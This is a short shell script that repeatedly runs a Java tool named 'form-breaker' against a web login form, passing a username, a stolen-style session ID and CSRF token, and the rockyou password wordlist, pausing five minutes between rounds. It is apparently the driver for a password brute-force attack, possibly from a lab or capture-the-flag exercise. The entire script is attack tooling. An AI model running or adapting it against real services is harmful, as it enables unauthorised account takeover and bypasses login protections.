#!/bin/sh

while true
do
    . ./tokens
    java -jar form-breaker-1.0-SNAPSHOT.jar meows $PHPSESSID $CSRF rockyou.reduced.txt
    sleep 300
done
